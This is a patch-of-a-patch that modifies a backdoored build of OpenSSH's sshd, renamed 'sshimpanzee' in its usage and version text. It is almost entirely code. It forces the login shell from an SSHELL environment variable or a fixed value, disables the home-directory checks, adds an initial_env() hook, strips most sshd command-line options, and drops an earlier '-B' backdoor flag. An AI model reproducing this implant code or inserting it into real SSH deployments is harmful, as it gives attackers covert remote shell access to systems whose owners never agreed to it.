@@ -1,3 +1,25 @@
+diff --git a/Makefile.in b/Makefile.in
+index c0ebfa04..d42957b8 100644
+--- a/Makefile.in
++++ b/Makefile.in
+@@ -118,7 +118,7 @@ SKOBJS=	ssh-sk-client.o
+ SSHOBJS= ssh.o readconf.o clientloop.o sshtty.o \
+ 	sshconnect.o sshconnect2.o mux.o $(SKOBJS)
+ 
+-SSHDOBJS=sshd.o auth-rhosts.o auth-passwd.o \
++SSHDOBJS=sshd.o initial_env.o auth-rhosts.o auth-passwd.o \
+ 	audit.o audit-bsm.o audit-linux.o platform.o \
+ 	sshpty.o sshlogin.o servconf.o serverloop.o \
+ 	auth.o auth2.o auth-options.o session.o \
+@@ -131,7 +131,7 @@ SSHDOBJS=sshd.o auth-rhosts.o auth-passwd.o \
+ 	srclimit.o sftp-server.o sftp-common.o \
+ 	sandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \
+ 	sandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \
+-	sandbox-solaris.o uidswap.o $(SKOBJS)
++	sandbox-solaris.o uidswap.o  $(SKOBJS)
+ 
+ SFTP_CLIENT_OBJS=sftp-common.o sftp-client.o sftp-glob.o
+ 
 diff --git a/auth.c b/auth.c
 index 03a777cc..0f50d2d9 100644
 --- a/auth.c
@@ -551,7 +573,7 @@ index 7ad43de8..e6cbc9b9 100644
  
  	char	**channel_timeouts;	/* inactivity timeout by channel type */
 diff --git a/session.c b/session.c
-index f30d7ac5..2758af1b 100644
+index f30d7ac5..da426372 100644
 --- a/session.c
 +++ b/session.c
 @@ -96,6 +96,8 @@
@@ -644,18 +666,50 @@ index f30d7ac5..2758af1b 100644
  }
  
  static void
-@@ -1567,8 +1574,8 @@ do_child(struct ssh *ssh, Session *s, const char *command)
+@@ -1567,8 +1574,10 @@ do_child(struct ssh *ssh, Session *s, const char *command)
  	 * Get the shell from the password data.  An empty shell field is
  	 * legal, and means /bin/sh.
  	 */
 -	shell = (pw->pw_shell[0] == '\0') ? _PATH_BSHELL : pw->pw_shell;
 -
 +	//shell = (pw->pw_shell[0] == '\0') ? _PATH_BSHELL : pw->pw_shell;
-+	shell = FORCEDSHELL;
++	shell = getenv("SSHELL");
++	if (shell == NULL)
++	  shell = FORCEDSHELL;
  	/*
  	 * Make sure $SHELL points to the shell from the password file,
  	 * even if shell is overridden from login.conf
-@@ -1653,7 +1660,7 @@ do_child(struct ssh *ssh, Session *s, const char *command)
+@@ -1621,19 +1630,19 @@ do_child(struct ssh *ssh, Session *s, const char *command)
+ #endif
+ 
+ 	/* Change current directory to the user's home directory. */
+-	if (chdir(pw->pw_dir) == -1) {
++	//if (chdir(pw->pw_dir) == -1) {
+ 		/* Suppress missing homedir warning for chroot case */
+ #ifdef HAVE_LOGIN_CAP
+-		r = login_getcapbool(lc, "requirehome", 0);
++	//	r = login_getcapbool(lc, "requirehome", 0);
+ #endif
+-		if (r || !in_chroot) {
+-			fprintf(stderr, "Could not chdir to home "
+-			    "directory %s: %s\n", pw->pw_dir,
+-			    strerror(errno));
+-		}
+-		if (r)
+-			exit(1);
+-	}
++	//	if (r || !in_chroot) {
++	//		fprintf(stderr, "Could not chdir to home "
++	//		    "directory %s: %s\n", pw->pw_dir,
++	//		    strerror(errno));
++	//	}
++	//	if (r)
++	//		exit(1);
++	//}
+ 
+ 	closefrom(STDERR_FILENO + 1);
+ 
+@@ -1653,7 +1662,7 @@ do_child(struct ssh *ssh, Session *s, const char *command)
  		int i;
  		char *p, *args;
  
@@ -664,7 +718,7 @@ index f30d7ac5..2758af1b 100644
  		args = xstrdup(command ? command : "sftp-server");
  		for (i = 0, (p = strtok(args, " ")); p; (p = strtok(NULL, " ")))
  			if (i < ARGV_MAX - 1)
-@@ -2564,7 +2571,7 @@ session_proctitle(Session *s)
+@@ -2564,7 +2573,7 @@ session_proctitle(Session *s)
  	if (s->pw == NULL)
  		error("no user for session %d", s->self);
  	else
@@ -674,7 +728,7 @@ index f30d7ac5..2758af1b 100644
  
  int
 diff --git a/sshd.c b/sshd.c
-index ce48602d..5d9e2d00 100644
+index ce48602d..5777d149 100644
 --- a/sshd.c
 +++ b/sshd.c
 @@ -44,6 +44,14 @@
@@ -777,7 +831,18 @@ index ce48602d..5d9e2d00 100644
  }
  
  static void
-@@ -1067,9 +1079,11 @@ listen_on_addrs(struct listenaddr *la)
+@@ -901,9 +913,7 @@ usage(void)
+ {
+ 	fprintf(stderr, "%s, %s\n", SSH_RELEASE, SSH_OPENSSL_VERSION);
+ 	fprintf(stderr,
+-"usage: sshd [-46DdeGiqTtV] [-C connection_spec] [-c host_cert_file]\n"
+-"            [-E log_file] [-f config_file] [-g login_grace_time]\n"
+-"            [-h host_key_file] [-o option] [-p port] [-u len]\n"
++"usage: sshimpanzee [-diver]"
+ 	);
+ 	exit(1);
+ }
+@@ -1067,9 +1077,11 @@ listen_on_addrs(struct listenaddr *la)
  			sock_set_v6only(listen_sock);
  
  		debug("Bind to port %s on %s.", strport, ntop);
@@ -790,7 +855,7 @@ index ce48602d..5d9e2d00 100644
  			error("Bind to port %s on %s failed: %.200s.",
  			    strport, ntop, strerror(errno));
  			close(listen_sock);
-@@ -1077,8 +1091,9 @@ listen_on_addrs(struct listenaddr *la)
+@@ -1077,8 +1089,9 @@ listen_on_addrs(struct listenaddr *la)
  		}
  		listen_socks[num_listen_socks] = listen_sock;
  		num_listen_socks++;
@@ -801,7 +866,7 @@ index ce48602d..5d9e2d00 100644
  		if (listen(listen_sock, SSH_LISTEN_BACKLOG) == -1)
  			fatal("listen on [%s]:%s: %.100s",
  			    ntop, strport, strerror(errno));
-@@ -1086,6 +1101,7 @@ listen_on_addrs(struct listenaddr *la)
+@@ -1086,6 +1099,7 @@ listen_on_addrs(struct listenaddr *la)
  		    ntop, strport,
  		    la->rdomain == NULL ? "" : " rdomain ",
  		    la->rdomain == NULL ? "" : la->rdomain);
@@ -809,7 +874,7 @@ index ce48602d..5d9e2d00 100644
  	}
  }
  
-@@ -1113,6 +1129,42 @@ server_listen(void)
+@@ -1113,6 +1127,42 @@ server_listen(void)
  		fatal("Cannot bind any address.");
  }
  
@@ -852,7 +917,7 @@ index ce48602d..5d9e2d00 100644
  /*
   * The main TCP accept loop. Note that, for the non-debug case, returns
   * from this function are in a forked subprocess.
-@@ -1169,7 +1221,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1169,7 +1219,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  			exit(received_sigterm == SIGTERM ? 0 : 255);
  		}
  		if (ostartups != startups) {
@@ -861,7 +926,7 @@ index ce48602d..5d9e2d00 100644
  			    listener_proctitle, startups,
  			    options.max_startups_begin, options.max_startups);
  			ostartups = startups;
-@@ -1199,15 +1251,25 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1199,15 +1249,25 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  				startup_pollfd[i] = npfd++;
  			}
  		}
@@ -894,7 +959,7 @@ index ce48602d..5d9e2d00 100644
  		if (ret == -1)
  			continue;
  
-@@ -1244,12 +1306,19 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1244,12 +1304,19 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  				break;
  			}
  		}
@@ -918,7 +983,7 @@ index ce48602d..5d9e2d00 100644
  			if (*newsock == -1) {
  				if (errno != EINTR && errno != EWOULDBLOCK &&
  				    errno != ECONNABORTED && errno != EAGAIN)
-@@ -1257,6 +1326,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1257,6 +1324,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  					    strerror(errno));
  				if (errno == EMFILE || errno == ENFILE)
  					usleep(100 * 1000);
@@ -926,7 +991,7 @@ index ce48602d..5d9e2d00 100644
  				continue;
  			}
  			if (unset_nonblock(*newsock) == -1) {
-@@ -1284,7 +1354,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1284,7 +1352,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  				close(startup_p[1]);
  				continue;
  			}
@@ -935,7 +1000,7 @@ index ce48602d..5d9e2d00 100644
  			for (j = 0; j < options.max_startups; j++)
  				if (startup_pipes[j] == -1) {
  					startup_pipes[j] = startup_p[0];
-@@ -1292,7 +1362,6 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1292,7 +1360,6 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  					startup_flags[j] = 1;
  					break;
  				}
@@ -943,7 +1008,7 @@ index ce48602d..5d9e2d00 100644
  			/*
  			 * Got connection.  Fork a child to handle it, unless
  			 * we are in debugging mode.
-@@ -1362,6 +1431,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1362,6 +1429,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  				return;
  			}
  
@@ -951,7 +1016,7 @@ index ce48602d..5d9e2d00 100644
  			/* Parent.  Stay in the loop. */
  			platform_post_fork_parent(pid);
  			if (pid == -1)
-@@ -1377,19 +1447,24 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+@@ -1377,19 +1445,24 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
  				close(config_s[0]);
  			}
  			close(*newsock);
@@ -977,26 +1042,131 @@ index ce48602d..5d9e2d00 100644
  		}
  	}
  }
-@@ -1596,7 +1671,7 @@ main(int ac, char **av)
+@@ -1571,6 +1644,7 @@ main(int ac, char **av)
+ 	sigemptyset(&sigmask);
+ 	sigprocmask(SIG_SETMASK, &sigmask, NULL);
+ 
++	initial_env();
+ 	/* Save argv. Duplicate so setproctitle emulation doesn't clobber it */
+ 	saved_argc = ac;
+ 	rexec_argc = ac;
+@@ -1596,21 +1670,8 @@ main(int ac, char **av)
  
  	/* Parse command-line arguments. */
  	while ((opt = getopt(ac, av,
 -	    "C:E:b:c:f:g:h:k:o:p:u:46DGQRTdeiqrtV")) != -1) {
-+	    "C:E:b:c:f:g:h:k:o:p:u:46DGQRTdeiqrtVB")) != -1) {
++	    "diver")) != -1) {
  		switch (opt) {
- 		case '4':
- 			options.address_family = AF_INET;
-@@ -1700,6 +1775,9 @@ main(int ac, char **av)
- 				exit(1);
- 			free(line);
+-		case '4':
+-			options.address_family = AF_INET;
+-			break;
+-		case '6':
+-			options.address_family = AF_INET6;
+-			break;
+-		case 'f':
+-			config_file_name = optarg;
+-			break;
+-		case 'c':
+-			servconf_add_hostcert("[command-line]", 0,
+-			    &options, optarg);
+-			break;
+ 		case 'd':
+ 			if (debug_flag == 0) {
+ 				debug_flag = 1;
+@@ -1618,15 +1679,7 @@ main(int ac, char **av)
+ 			} else if (options.log_level < SYSLOG_LEVEL_DEBUG3)
+ 				options.log_level++;
  			break;
-+		case 'B':
-+		  options.backdoor = 1;
-+		  break;
- 		case 'V':
- 			fprintf(stderr, "%s, %s\n",
- 			    SSH_VERSION, SSH_OPENSSL_VERSION);
-@@ -1709,17 +1787,18 @@ main(int ac, char **av)
+-		case 'D':
+-			no_daemon_flag = 1;
+-			break;
+-		case 'G':
+-			do_dump_cfg = 1;
+-			break;
+-		case 'E':
+-			logfile = optarg;
+-			/* FALLTHROUGH */
++		
+ 		case 'e':
+ 			log_stderr = 1;
+ 			break;
+@@ -1636,90 +1689,27 @@ main(int ac, char **av)
+ 		case 'r':
+ 			rexec_flag = 0;
+ 			break;
+-		case 'R':
+-			rexeced_flag = 1;
+-			inetd_flag = 1;
+-			break;
+-		case 'Q':
+-			/* ignored */
+-			break;
+-		case 'q':
+-			options.log_level = SYSLOG_LEVEL_QUIET;
+-			break;
+-		case 'b':
+-			/* protocol 1, ignored */
+-			break;
+-		case 'p':
+-			options.ports_from_cmdline = 1;
+-			if (options.num_ports >= MAX_PORTS) {
+-				fprintf(stderr, "too many ports.\n");
+-				exit(1);
+-			}
+-			options.ports[options.num_ports++] = a2port(optarg);
+-			if (options.ports[options.num_ports-1] <= 0) {
+-				fprintf(stderr, "Bad port number.\n");
+-				exit(1);
+-			}
+-			break;
+-		case 'g':
+-			if ((options.login_grace_time = convtime(optarg)) == -1) {
+-				fprintf(stderr, "Invalid login grace time.\n");
+-				exit(1);
+-			}
+-			break;
+-		case 'k':
+-			/* protocol 1, ignored */
+-			break;
+-		case 'h':
+-			servconf_add_hostkey("[command-line]", 0,
+-			    &options, optarg, 1);
+-			break;
+-		case 't':
+-			test_flag = 1;
+-			break;
+-		case 'T':
+-			test_flag = 2;
+-			break;
+-		case 'C':
+-			connection_info = get_connection_info(ssh, 0, 0);
+-			if (parse_server_match_testspec(connection_info,
+-			    optarg) == -1)
+-				exit(1);
+-			break;
+-		case 'u':
+-			utmp_len = (u_int)strtonum(optarg, 0, HOST_NAME_MAX+1+1, NULL);
+-			if (utmp_len > HOST_NAME_MAX+1) {
+-				fprintf(stderr, "Invalid utmp length.\n");
+-				exit(1);
+-			}
+-			break;
+-		case 'o':
+-			line = xstrdup(optarg);
+-			if (process_server_config_line(&options, line,
+-			    "command-line", 0, NULL, NULL, &includes) != 0)
+-				exit(1);
+-			free(line);
+-			break;
+-		case 'V':
+-			fprintf(stderr, "%s, %s\n",
+-			    SSH_VERSION, SSH_OPENSSL_VERSION);
++		case 'v':
++			fprintf(stderr, "Sshimpanzee version 1.0, SSH Version %s\n",
++			    SSH_VERSION);
+ 			exit(0);
+ 		default:
+ 			usage();
  			break;
  		}
  	}
@@ -1018,7 +1188,7 @@ index ce48602d..5d9e2d00 100644
  	/* If requested, redirect the logs to the specified logfile. */
  	if (logfile != NULL)
  		log_redirect_stderr_to(logfile);
-@@ -1755,7 +1834,7 @@ main(int ac, char **av)
+@@ -1755,7 +1745,7 @@ main(int ac, char **av)
  	if ((cfg = sshbuf_new()) == NULL)
  		fatal_f("sshbuf_new failed");
  	if (rexeced_flag) {
@@ -1027,7 +1197,7 @@ index ce48602d..5d9e2d00 100644
  		recv_rexec_state(REEXEC_CONFIG_PASS_FD, cfg);
  		if (!debug_flag) {
  			startup_pipe = dup(REEXEC_STARTUP_PIPE_FD);
-@@ -1814,7 +1893,6 @@ main(int ac, char **av)
+@@ -1814,7 +1804,6 @@ main(int ac, char **av)
  		fprintf(stderr, "Extra argument %s.\n", av[optind]);
  		exit(1);
  	}
@@ -1035,7 +1205,7 @@ index ce48602d..5d9e2d00 100644
  	debug("sshd version %s, %s", SSH_VERSION, SSH_OPENSSL_VERSION);
  
  	if (do_dump_cfg)
-@@ -1996,10 +2074,10 @@ main(int ac, char **av)
+@@ -1996,10 +1985,10 @@ main(int ac, char **av)
  		    (st.st_uid != getuid () ||
  		    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))
  #else
@@ -1049,7 +1219,7 @@ index ce48602d..5d9e2d00 100644
  	}
  
  	if (test_flag > 1)
-@@ -2054,9 +2132,18 @@ main(int ac, char **av)
+@@ -2054,9 +2043,18 @@ main(int ac, char **av)
  
  		if (daemon(0, 0) == -1)
  			fatal("daemon() failed: %.200s", strerror(errno));
@@ -1069,7 +1239,7 @@ index ce48602d..5d9e2d00 100644
  	/* Reinitialize the log (because of the fork above). */
  	log_init(__progname, options.log_level, options.log_facility, log_stderr);
  
-@@ -2104,7 +2191,7 @@ main(int ac, char **av)
+@@ -2104,7 +2102,7 @@ main(int ac, char **av)
  	}
  
  	/* This is the child processing a new connection. */
